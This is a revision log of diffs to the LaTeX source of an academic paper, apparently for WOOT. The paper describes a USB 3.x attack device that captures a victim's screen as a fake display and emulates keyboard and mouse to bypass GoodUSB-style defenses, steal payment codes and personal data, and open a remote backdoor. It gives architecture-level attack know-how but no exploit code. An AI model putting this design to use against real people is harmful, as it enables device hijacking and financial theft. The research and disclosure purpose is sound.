 relies on the rich experience of administrators to build a whitelist. However, some
@@
 by the device to the user and let the user decides whether to authorize. When a device
-is plugged in, GoodUSB will load its driver but limit its functionality until a
+is plugged in, GoodUSB loads its driver but limits its functionality until a
 series of authorizations are completed. These authorizations are designed to be
@@
 an automatic script. Thus this defense is sufficient for a normal BadUSB attack. But
-if the attacker has the access to victim's screen, GoodUSB will be bypassed
-easily as the attacker can just complete this authorization manually and
+if the attacker has the access to victim's screen, GoodUSB would be bypassed
+easily as the attacker can complete this authorization manually and
 perform subsequent attacks.
@@
 After the USB enumeration and driver loading, some related works
-trying to archive `defense in depth'
-against BadUSB attack.  Neuner et 
-al.~\cite{neuner2018usblock}
-prevents BadUSB attacks from the malicious flash drive by analyzing
-the temporal characteristics of BadUSB-like attacks. This defense mechanism is
+archive `defense in depth'
+against BadUSB attacks.  Neuner \emph{et al.}~\cite{neuner2018usblock}
+prevent BadUSB attacks from the malicious flash drive by analyzing
+the temporal characteristics of BadUSB-liked attacks. This defense mechanism is
 effective because the attacker cannot obtain the screen of the host using
-BadUSB. In this case, the malicious device can only inject key stoke in a very
+BadUSB. In this case, the malicious device can only inject keystrokes in a very
 short time to reduce the risk of being discovered. This defect causes the
-typing characteristics of BadUSB to be detectable. Pham et
-al.~\cite{pham2010optimizing} optimize windows security features. It can
+typing characteristics of BadUSB to be detectable. Pham \emph{et al.}~\cite{pham2010optimizing} optimize windows security features, which can
 block the execution of unsigned files and the installation of unsigned drivers
@@
 of the academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
-exists an attack called JFC (juicy film charging)~\cite{JFC} which abuses the MHL
+exists an attack called JFC (Juicy Film Charging)~\cite{JFC} which abuses the MHL
 standard to steal video stream from the victim. In order to mitigate this
 issue, Meng et al.~\cite{meng2018252} proposed a statistical model using status
-like GPU/CPU usage to detect JFC attack.
+like GPU/CPU usage to detect JFC attacks.
 
-To summarize, there exists a clear trade-off between the effectiveness and the
+Therefore, there exists a clear trade-off between the effectiveness and the
 plug-and-play property. Though hardware disabling solutions like USB Condom
@@
 Other solutions like GoodUSB or whitelist are either bypassable or insufficient
-under certain cases.  Some vendors may sacrifice defensive capabilities to
+under certain scenarios. Vendors may sacrifice complete security to
 improve usability, which allows attackers to take advantage of.
 
-We summarize the former effort in USB attack and defense in
+We summarize the former efforts on USB attacks and defenses in
 Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of
@@
 		\hline
-		\diagbox[width=1.52in,height=0.4in] {Defence}{Attack} & \makecell*[c]{Facedancer~\cite{facedancer},\\ Syzkaller~\cite{syzkaller}} &\cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC~\cite{JFC}&		\makecell{
+		\diagbox[width=1.52in,height=0.4in] {\textbf{Defense}}{\textbf{Attack}} & \makecell*[c]{Facedancer~\cite{facedancer},\\ Syzkaller~\cite{syzkaller}} &\cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC~\cite{JFC}&		\makecell{
 			Duqu~\cite{duqu}, \\
-			\cite{brain, stuxnet, conficker,flame}} &\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \tool \\
+			\cite{brain, stuxnet, conficker,flame}} &\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \textbf{\tool} \\
 		\hline
@@
 
-		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner \emph{et al.}~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
 		\hline
-		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham \emph{et al.}~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
 		\hline
@@
 	\item[2] \circlehalf \@ means that the defense is partial effective
-	\item[3] \circleempty \@  means that the defense is uneffective
+	\item[3] \circleempty \@  means that the defense is not effective
 	\end{tablenotes}
-	\caption{Effectiveness of Defense against Different Attacks}
+	\caption{Effectiveness of Defenses against USB Attacks}
 	\label{table:attack_vs_defense}

### 2021-01-30 WOOT/Files/related_work.tex
update related_work table

--- 2021-01-28 WOOT/Files/related_work.tex
@@
 	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|c|}
+	\begin{tabular}{|c|c|c|c|c|c|}
 
@@
 			Duqu~\cite{duqu}, \\
-			\cite{brain, stuxnet, conficker,flame}} &\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \tool \\
+			\cite{brain, stuxnet, conficker,flame}} & \tool \\
 		\hline
-		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull&  \circleempty&\circlefull\\
+		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull\\
 		\hline
@@
 			TMSUI~\cite{yang2015tmsui}
-		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circleempty&  \circleempty &\circlehalf\\
+		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circlehalf\\
 
 		\hline
-		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty&  \circleempty &\circleempty\\
+		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty\\
 		\hline
 
-		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty\\
 		\hline
-		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty\\
 		\hline
-		\makecell{JFCGuard~\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
+		\makecell{JFCGuard~\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlehalf &\circleempty&   \circlehalf \\
 			\hline

### 2021-01-30 WOOT/Files/related_work.tex

--- 2021-01-30 WOOT/Files/related_work.tex
@@
 			Duqu~\cite{duqu}, \\
-			\cite{brain, stuxnet, conficker,flame}} &\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \textbf{\tool} \\
+			\cite{brain, stuxnet, conficker,flame}} & \tool \\
 		\hline
-		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull&  \circleempty&\circlefull\\
+		\makecell{USB condom~\cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull\\
 		\hline
@@
 			TMSUI~\cite{yang2015tmsui}
-		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circleempty&  \circleempty &\circlehalf\\
+		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circlehalf\\
 
 		\hline
-		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty&  \circleempty &\circleempty\\
+		\makecell{GoodUSB~\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty\\
 		\hline
 
-		\makecell{Neuner \emph{et al.}~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner et al.~\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty\\
 		\hline
-		\makecell{Pham \emph{et al.}~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham et al.~\cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty\\
 		\hline
-		\makecell{JFCGuard~\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
+		\makecell{JFCGuard~\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlehalf &\circleempty&   \circlehalf \\
 			\hline

### 2021-01-30 WOOT/Files/badusb.tex
part of badusb.tex; not finish.

@@
 We build our threat model on the basic assumptions that common users without
-technical background would not treat normal-looking USB device as highly
-dangerous and be cautious about them. These assumptions are approved in a
-relevant work about charging attack~\cite{JFCImpact}. Moreover, we neglect the
-effect of notification about common USB device, as normal users usually are not
-equipped with the necessary knowledge to fully understand such notices. In
+technical background would not treat normal-looking USB device as malicious and be cautious about them. This assumption is consistent with existing works~\cite{JFCImpact}. Moreover, we neglect the
+effect of notifications from USB devices, as users may not have the knowledge to fully understand such notifications. In
 fact, during our experiment, no device had security notifications raised about
-suspicious USB devices and only mobile devices had raised charging notification
-about our \tool, which may not be a sufficient warning towards users.
+suspicious USB devices and only mobile devices had raised a charging notification
+about our \tool, which may not be a sufficient warning for users.
 
 We also assume the victim's device is equipped with fully functional USB 3.x
-protocol and USB Type C connector. As the USB 3.x standard is more and more
+protocol and USB Type-C connector. As the USB 3.x standard is
 common nowadays, this assumption can be easily fulfilled especially in recent
@@
 %\outline{Remote Control Mode}\\ \outline{OCR/QR Recognition Mode}\\
-As we introduced in Section~\ref{sec:related_work}, there are plenty of
-existing work~\cite{rubber,badusb,
-rubberducky2020,usbbypassing,iseeyou,usbdriver} focusing on BadUSB attack.
+
+As introduced in Section~\ref{sec:related_work}, 
+existing works~\cite{rubber,badusb,
+rubberducky2020,usbbypassing,iseeyou,usbdriver} focus on BadUSB attacks.
 Many of these take advantage of the \textit{trust-by-default} policy of PC,
@@
 and disks, which makes the attacks less effective; \ding{183} accurate attacks
-could not be performed due to lack of user interface (UI).  Whatever HID the
+could not be performed due to lack of user interface (UI) status. Whatever HID the
 attackers simulate their USB devices to be, they could not obtain the UI to
-check the current situation, which makes it nearly impossible to carry out
-their attacks precisely or confirm the effects after attacks.
-
-In this work, we utilized the new features of USB 3.x~\cite{usb31,usb32} to
-address the problems above.  Benefiting from latest protocol, we simulated
-external display and thus obtained the video stream to perform accurate
-attacks.
+check the status information, which makes it nearly impossible to carry out
+their attacks precisely or know the effects after attacks.
 
@@
 Based on the drawbacks introduced above, several defense mechanisms were
-proposed, like GoodUSB~\cite{tian2015defending}. These defense mechanism
+proposed. GoodUSB~\cite{tian2015defending}
 implemented a CAPTCHA-like~\cite{captcha} procedure, which requires user to
 complete certain challenges when an unknown HID device is plugged in. As the
-BadUSB is only able to emulate a limited kind of devices like HID or disks, by
-no means the BadUSB can bypass it. Our \tool, on the other hand, is capable of
-bypassing this type of defense. Taking advantage of USB 3.x~\cite{usb31,usb32},
+BadUSB is only able to emulate a limited kind of devices such as HIDs or disks, by
+no means the BadUSB can bypass it.
+
+In this work, we utilize the new features of USB 3.x~\cite{usb31,usb32} to
+address the problem above.  Benefiting from the latest protocol, we simulate
+external display and thus obtain the video stream to perform accurate
+attacks.
+Thus, our \tool is capable of
+bypassing defenses such as GoodUSB. Taking advantage of USB 3.x~\cite{usb31,usb32},
 \tool can fetch the video stream of the victim and complete the challenge
@@
 
-As there were various BadUSB implementations available, we only focus on its
-core functionality and our extension. In this section, we first introduce the
+As there were various BadUSB implementations available, this work focuses on our new extensions. Next, we first introduce the
 components we used in \tool, then we focus on the three different attack modes
@@
 
-The components in our attack model are as follows, and the relation between
-them is illustrated at Figure~\ref{fig:attack_model}. \fengwei{We need to
-explain the figure. What are the boxes? Where is victim? Where is the attacker?
-The list below only shows the internal components in the malicious USB device.
-We might also consider to explain this in the Figure caption.}
+Figure~\ref{fig:attack_model} shows the architecture of our attack model.
+\mycircled{1} represents the victim's devices; \mycircled{2} is our \tool; \mycircled{3} is the attacker's remote PC.
+The details of each component in \tool are as follows.\mycircled{1}
+
+%\fengwei{We need to
+%explain the figure. What are the boxes? Where is victim? Where is the attacker?
+%The list below only shows the internal components in the malicious USB device.
+%We might also consider to explain this in the Figure caption.}
 
@@
 	\includegraphics[width=\linewidth]{./Figs/attack_model.png}
+
+	\begin{tabular}{ll}
+	\mycircled{1} Victim's Devices    &\mycircled{2}\tool\\
+	\mycircled{3} Attacker's Remote PC
+	\end{tabular}
+
 	\caption{Attack Model}%\shuqing{Need to be more compact.}

### 2021-01-30 WOOT/Files/badusb.tex
change of caption order
fix
more, not done.

@@
 \mycircled{1} represents the victim's devices; \mycircled{2} is our \tool; \mycircled{3} is the attacker's remote PC.
-The details of each component in \tool are as follows.\mycircled{1}
+The details of each component in \tool are as follows.
 
@@
 \begin{itemize}
-	\item\textit{USB 3.x Hub} exports the USB 3.x connector into various ports, like DisplayPort, USB 2.0 port etc.
-	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by embedded computer.
-	\item\textit{Single Board Computer} processes video stream from the victim where private data is extracted and transmitted via GSM/WiFi to the attacker.
-	\item\textit{HID Emulator} emulates HID device which can be controlled from the attacker.
+
+	\item\underline{USB 3.x Hub} exports the USB 3.x connector into various ports, like DisplayPort, USB 2.0 port, etc.
+
+	\item\underline{Video Capture Card} converts DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by the Single Board Computer (i.e., an embedded computer).
+
+	\item\underline{HID Emulator} emulates HID device which can be controlled from the attacker.
+
+	\item\underline{Single Board Computer} processes video stream from the victim via the Video Capture Card or sends commands to the victim via HID Emulator.
+
+	\item\underline{Wi-Fi/GSM Module} transmits the sensitive data or receives commands to/from the remote attacker PC.
+
 \end{itemize}

### 2021-01-30 ocr/ocr.sh
update ocr scripts

@@ -1,7 +1,7 @@
 #! /bin/bash
 function qwq() {
-    mkdir $1
-    ffmpeg -i $1.mkv -r 5 $1/%05d.jpeg
+        mkdir $1
+        ffmpeg -i $1.mkv -r 5 $1/%05d.jpeg
 }
 
 qwq wyc
@@ -9,5 +9,3 @@ qwq gh
 qwq wcx
 qwq hjy
 qwq lsq
-
-

### 2021-01-30 WOOT/Files/badusb.tex
manually fix a conflict.

@@
 
-\textbf{Scripting Mode.} This mode majorly relies on the ``HID Emulator'' to
+\textbf{Scripting Mode.} This mode majorly relies on the ``HID Emulator'' in the Figure~\ref{fig:attack_model} to
 send constructed HID packet to the victim. These constructed HID packets are
@@
 function of the original BadUSB. Based on this, we made the following
-improvement.
+improvements.
 
 First, \tool supports defense-bypassing. As the original BadUSB cannot get
-feedback from the victim, defense mechanisms like GoodUSB
-\cite{tian2015defending} are sufficient to prevent these BadUSB attacks.
+feedback from the victim, defense mechanisms like GoodUSB~\cite{tian2015defending} are sufficient to prevent these BadUSB attacks.
 However, these defense mechanisms leverage visual notification to block access
-for unknown USB devices. This means that when the defense request authorization
+for unknown USB devices. This means that when the defense requests authorization
 from the user, our \tool is able to capture the content of authorization
@@
 emulation and automation were not supported by the original version of BadUSB.
-Yet with the video output support from USB 3.x, our \tool implements
+Yet with the video output support from USB 3.x, our \tool implements a
 full-functional mouse emulation. This function enables attacks toward pure GUI
-programs and shows great potential in the mobile attack scenario. Details can
+programs and shows attacks in the mobile attack scenarios. Details can
 be obtained in Section~\ref{sec:experiment}.
@@
 The advantage of this mode is that it archives defense bypass and attack
-feedback with video streaming.  \fengwei{I don't understand the sentence below.}\hongyi{Fixed, I think it's redundant and less important}
+feedback with video streaming.  
+%\fengwei{I don't understand the sentence below.}\hongyi{Fixed, I think it's redundant and less important}
 %As mentioned above, we only require video stream at the beginning (defense
@@
 Moreover, with mouse
-supported, \tool extends the original BadUSB attack surface and perform well in
-mobile device.
+supported, \tool extends the original BadUSB attack and results in further attacks in
+mobile devices.
 
@@
 USB device and solely relies on the video stream function of USB 3.x; it uses
-``Video Capture'' component to transmit the stream to embedded ``Single Board Computer''\fengwei{What is embedded computer?
-Do we define this in the previous\hongyi{Fixed by using the term mentioned in Figure}
-text?}. The victim's device would mistakenly treat \tool as an external monitor
+``Video Capture'' component as shown in the Figure~\ref{fig:attack_model} to transmit the stream to the embedded ``Single Board Computer''.
+%\fengwei{What is embedded computer? Do we define this in the previous\hongyi{Fixed by using the term mentioned in Figure}
+%text?}. 
+The victim's device would mistakenly treat \tool as an external monitor
 and output its video stream. This stream is latter processed by the embedded
-computer to extract private data.
+computer to extract sensitive data.
 
@@
 and detect for ``valuable'' private data.  The data is considered as
-``valuable'' or not is decided by a customized detector, we implement a simple
-payment code detector for the demonstration purpose. Though this detector is
-simple to implement, we successfully transfer money from the victim to the
+``valuable'' or not is decided by a customized detector, we implemented a simple
+payment code detector for the poof-of-concept purpose, which demonstrates that we successfully transfer money from a victim to an
 attacker. More detail can be obtained in Section~\ref{sec:experiment}.
@@
 It is worth mentioning that \tool under this mode is completely passive, making
-it hard to be detected and defended. With different detector implemented, \tool
+it hard to be detected. With different detector implemented, \tool
 under this mode is capable of serving more purposes.
@@
 required to control a computer/mobile device remotely, including a video stream
-and a keyboard/mouse emulation. Thus with all components enabled, not only will
+and a keyboard/mouse emulation. Thus with all components enabled, not only
 the victim's device treat \tool as an external display, but also a valid HID
@@
 
-\tool under this mode follows a simple logic. \tool will receive video stream
+\tool under this mode follows a simple logic. \tool receives video stream
 from the victim's device and redirect it to the attacker via GSM/WiFi. In the
 meanwhile, \tool also receives keystrokes and mouse movement from the attacker
-through GSM/WiFi and replay them to the victim by the USB emulation.
+through GSM/WiFi and replays them to the victim by the USB emulation.
 
-This mode enable attacker to perform delicate operation that is beyond
+This mode enable attacker to perform delicate operations that are beyond
 automation. Moreover, this mode provides a backdoor that does not require host
@@
 The advantage of this mode is that it can completely hijack the victim device
-and provide a backdoor beyond detection of firewalls. But this complete control
+and provide a backdoor beyond detection of firewalls; however, this complete control
 also comes with the price of high power consumption and risk of being detected

### 2021-01-30 WOOT/Files/experiment.tex
edits, not done.

@@
 \label{sec:experiment}
-\shuqing{Many parts in this section are much more likely to lie in implementation, introducing how \tool works. Doesn't look like experiment.}
+%\shuqing{Many parts in this section are much more likely to lie in implementation, introducing how \tool works. Doesn't look like experiment.}
 
 %\shuqing{Experiment for devices and case study needed.}
+
 To evaluate the effectiveness of \tool in different modes, we conducted three
@@
 
-\textit{Setup.} \fengwei{I would suggest to add references for devices such as
-Pi, ATMEGA32U4 board, Yamazawa, etc.} As mentioned in Section~\ref{sec:badusb},
+\textit{Setup.} 
+%\fengwei{I would suggest to add references for devices such as
+%Pi, ATMEGA32U4 board, Yamazawa, etc.} 
+As mentioned in Section~\ref{sec:badusb},
 our \tool only requires common components that are easily accessible online or
 in any electronic store. Here we choose the following parts to build a
-prototype. To begin with, we choose the Raspberry Pi 4B~\cite{pi4b} as the embedded
-computer inside \tool, which is powerful enough to process video data and has
-an onboard WiFi chip. As for the HID emulator, we decide to use an ATMEGA32U4 board~\cite{atmel}
-with USB protocol support. This Atmel chip is able to emulate most HID devices
-with our modified firmware. About the USB 3.x hub, we use one from the
-UGREEN~\cite{ugreen}, which supports HDMI, USB 2.0, and many other exported peripheral.
+prototype. To begin with, we choose the Raspberry Pi 4B~\cite{pi4b} as the embedded Single Board 
+Computer inside \tool, which is powerful enough to process video data and has
+an onboard WiFi chip. As for the HID Emulator, we use an Atmel ATMEGA32U4 board~\cite{atmel}
+with USB protocol support, which is able to emulate multiple HID devices
+with our modified firmware. About the USB 3.x Hub, we use one from the
+UGREEN~\cite{ugreen}, which supports HDMI, USB 2.0, and many other exported peripherals.
 Apart from these essential parts, we also use an auxiliary power-bank to
@@
 The image of our prototype \tool can be found in Figure~\ref{fig:armory}.
-\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
-2, 3, 4, and 5?}\hongyi{Is the caption sufficient? If explain here, I feel quite redundant}
+\mycircled{A} is a Huawei mobile phone as the victim's device; \mycircled{B} is a compact look of \tool prototype; \mycircled{1} is the USB 3.x Hub; \mycircled{2} is a Raspberry Pi 4B as the Single Board Computer; \mycircled{3} is an auxiliary power bank; \mycircled{4} is the Video Capture Card; \mycircled{5} is Atmel ATMEGA32U4 board as the HID Emulator.
+%\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
+%2, 3, 4, and 5?}\hongyi{Is the caption sufficient? If explain here, I feel quite redundant}
+\fengwei{I think it is necessary to explain them in the text again.}
 

### 2021-01-30 WOOT/Files/experiment.tex
Figures

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 	\begin{tabular}{ll}
-	\mycircled{A}Victim's Device    &\mycircled{B}\tool\\
-	\mycircled{1}USB 3.x Hub        &\mycircled{2}Raspberry Pi 4B\\
-	\mycircled{3}Auxiliary Power Bank &\mycircled{4}Video Capture\\
-	\mycircled{5}ATMEGAA32U4 Board
+	\circled[text=white,fill=myyellow]{\scriptsize{A}} Victim's Device    &\circled[text=white,fill=myyellow]{\scriptsize{B}}~\tool\\
+	\circled[text=white,fill=myyellow]{\footnotesize{1}} USB 3.x Hub        &\circled[text=white,fill=myyellow]{\footnotesize{2}} Raspberry Pi 4B\\
+	\circled[text=white,fill=myyellow]{\footnotesize{3}} Auxiliary Power Bank &\circled[text=white,fill=myyellow]{\footnotesize{4}} Video Capture\\
+	\circled[text=white,fill=myyellow]{\footnotesize{5}} ATMEGAA32U4 Board
 	\end{tabular}

### 2021-01-30 WOOT/Files/experiment.tex
edits.
Color

--- 2021-01-30 WOOT/Files/experiment.tex
@@
 	\begin{tabular}{ll}
-	\mycircled{A}Victim's Device    &\mycircled{B}\tool\\
-	\mycircled{1}USB 3.x Hub        &\mycircled{2}Raspberry Pi 4B\\
-	\mycircled{3}Auxiliary Power Bank &\mycircled{4}Video Capture\\
-	\mycircled{5}ATMEGAA32U4 Board
+	\circled[text=white,fill=myblue]{\scriptsize{A}} Victim's Device    &\circled[text=white,fill=myblue]{\scriptsize{B}}~\tool\\
+	\circled[text=white,fill=myblue]{\footnotesize{1}} USB 3.x Hub        &\circled[text=white,fill=myblue]{\footnotesize{2}} Raspberry Pi 4B\\
+	\circled[text=white,fill=myblue]{\footnotesize{3}} Auxiliary Power Bank &\circled[text=white,fill=myblue]{\footnotesize{4}} Video Capture\\
+	\circled[text=white,fill=myblue]{\footnotesize{5}} ATMEGAA32U4 Board
 	\end{tabular}

### 2021-01-30 WOOT/Files/related_work.tex

@@
 We summarize the former efforts on USB attacks and defenses in
-Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of
-each defense against various attacks including our \tool.
+Table~\ref{table:attack_vs_defense}.
+\cite{usbkiller, cable,smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip} are not included in this table, because these works are all recovering or injecting signal on the physical layer, we only illustrate the effectiveness of
+each defense against various attacks, including our \tool, on the software layer in Table~\ref{table:attack_vs_defense}.
 

### 2021-01-30 WOOT/BadUSBC.tex
Minor: abs

--- 2021-01-28 WOOT/BadUSBC.tex
@@
 \fengwei{What results?}we got valuable results.
-\fengwei{what countermeasures do we propose? including isolated UI rendering.}
-We also proposed reasonable countermeasures for our attack model, which may be inspiring for future research on defense methods.
+%\fengwei{what countermeasures do we propose? including isolated UI rendering.}
+We also proposed reasonable countermeasures for our attack model, including isolated UI rendering, external hardware authorization and distrust-by-default, which may be inspiring for future research on defense methods.
 \end{abstract}

### 2021-01-30 WOOT/Files/experiment.tex
edits.

@@
 
-\textit{Setup.} 
+\textbf{Setup.} 
 %\fengwei{I would suggest to add references for devices such as
@@
 provide power for the Raspberry Pi and the mobile devices used by the victim.
-The image of our prototype \tool can be found in Figure~\ref{fig:armory}.
-\mycircled{A} is a Huawei mobile phone as the victim's device; \mycircled{B} is a compact look of \tool prototype; \mycircled{1} is the USB 3.x Hub; \mycircled{2} is a Raspberry Pi 4B as the Single Board Computer; \mycircled{3} is an auxiliary power bank; \mycircled{4} is the Video Capture Card; \mycircled{5} is Atmel ATMEGA32U4 board as the HID Emulator.
+The image of our \tool prototype can be found in Figure~\ref{fig:armory}.
+\mycircled{A} is a Huawei mobile phone as the victim's device; \mycircled{B} is a compact look of \tool prototype; \mycircled{1} is the USB 3.x Hub; \mycircled{2} is a Raspberry Pi 4B as the Single Board Computer; \mycircled{3} is an auxiliary power bank; \mycircled{4} is the Video Capture Card; \mycircled{5} is an Atmel ATMEGA32U4 board as the HID Emulator.
 %\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
@@
 	\begin{tabular}{ll}
-	\circled[text=white,fill=myblue]{\scriptsize{A}} Victim's Device    &\circled[text=white,fill=myblue]{\scriptsize{B}}~\tool\\
-	\circled[text=white,fill=myblue]{\footnotesize{1}} USB 3.x Hub        &\circled[text=white,fill=myblue]{\footnotesize{2}} Raspberry Pi 4B\\
-	\circled[text=white,fill=myblue]{\footnotesize{3}} Auxiliary Power Bank &\circled[text=white,fill=myblue]{\footnotesize{4}} Video Capture\\
-	\circled[text=white,fill=myblue]{\footnotesize{5}} ATMEGAA32U4 Board
+	\mycircled{A}Victim's Device    &\mycircled{B}\tool\\
+	\mycircled{1}USB 3.x Hub        &\mycircled{2}Raspberry Pi 4B\\
+	\mycircled{3}Auxiliary Power Bank &\mycircled{4}Video Capture\\
+	\mycircled{5}ATMEGAA32U4 Board
 	\end{tabular}
 
-	\caption{\tool}
+	\caption{\tool Prototype}
 	\label{fig:armory}
@@
 
-\subsection{Scripting mode}
+\subsection{HID Emulator Mode}
 
-In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13
+In the experiment of HID emulator mode, we used {Lenovo Xiaoxin Pro 13
 2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as the
@@
 keyboard and a home-brewed version of GoodUSB~\cite{tian2015defending} is
-deployed to test the defense bypassing. We have tried to deploy the original
+deployed to test the defense-bypassing. We have tried to deploy the original
 GoodUSB on the target device; as the GoodUSB is proposed in 2015, the code is
-outdated and cannot be executed at modern OS; so we have to home-brew a similar
+outdated and cannot be executed at target device; so we have to home-brew a similar
 defense mechanism based on its paper~\cite{tian2015defending}.  In the
 beginning, our home-brewed version of GoodUSB asked the victim to manually complete
-a CAPTCHA to authorize the new USB device, a.k.a our \tool. But at this time,
-by the design of GoodUSB, \fengwei{The following sentence is hard to
-understand.}\hongyi{Fixed, removed redundant description} our \tool can already perform limited keystroke to complete the
-CAPTCHA with the video stream from \tool. Up
-to this point, the bypass of defense like GoodUSB is completed as our \tool
-gains full function from the GoodUSB and becomes a trusted device. Then, our
-\tool works similar to the original BadUSB, inserting keystroke to perform
+a CAPTCHA to authorize the new USB device, a.k.a our \tool. 
+%But at this time,
+%by the design of GoodUSB, 
+%\fengwei{The following sentence is hard to
+%understand.}\hongyi{Fixed, removed redundant description} 
+However, our attack can enter keystrokes to complete the
+CAPTCHA with the video stream by \tool. Up
+to this point, the bypass of defense like GoodUSB is completed and our \tool
+becomes a trusted device. Next, our
+\tool works similar to the original BadUSB, inserting keystrokes to perform
 arbitrary execution on the laptop. We tested three scripts, ranging from
 reverse shell backdoor to malware payload execution, all of which resulting in
-success.  With this experiment, we have proven the defense bypassing is successful
+success. With this experiment, we have demonstrated the defense-bypassing is successful
 using \tool.

### 2021-01-30 WOOT/Files/experiment.tex
done with video capture mode in the experiments.

@@
 
-\subsection{Privacy extraction mode}
+\subsection{Video Capture Mode}
 
-During the experiment of privacy extraction, we chose \textit{HUAWEI P30}, a
+During the experiment of privacy extraction via our video capture mode, we chose \textit{HUAWEI P30}, a
 smartphone in EMUI 9.1 (Android 9.0 based) with a USB Type-C interface, as the
-target device.  In the privacy extraction mode, \tool passively captured video
-from the victim's device and used \textit{OpenCV} to identify the valuable
-information from video stream.  When the victim viewed text or photos with
-text, \tool used the techniques of Optical Character Recognition (OCR) to
+target device.  In the privacy extraction experiment, \tool passively captured video
+from the victim's device and used \textit{OpenCV} to identify the sensitive
+information from the video stream.  When the victim viewed text or photos with
+text, \tool used the techniques of Optical Character Recognition (OCR) \fengwei{do we need a reference for OCR?} to
 extract text from corresponding video frames. In this experiment, the attacker had
 successfully extracted text like name, address, ID number, and other sensitive
-personal information. We also tested the payment code extractor, which the enables
-attacker to identify payment code in the video stream and perform transactions
+personal information. We also tested the payment code extractor, which enables
+an attacker to identify payment code in the video stream and perform transactions
 without the password. As this is also a part of our case study, more details about
-the data extracted can be found in Section~\ref{subsec:case_study} and
+the extracted sensitive data can be found in Section~\ref{subsec:case_study} and
 Table~\ref{table:information_extracted}.
 
-\fengwei{I don't understand the following sentence. Both modes need to capture
-the video stream. Don't understand why it is more power-efficient.}
-\hongyi{Reasonable, changed to other advantage}
-After the
-experiment, we have found that as privacy extraction mode only needs to
-process the victim's video stream locally, it does not need to transmit the real-time video back to the attacker.
-This mode is useful when there is no stable network connection between \tool and the attacker.
+%\fengwei{I don't understand the following sentence. Both modes need to capture
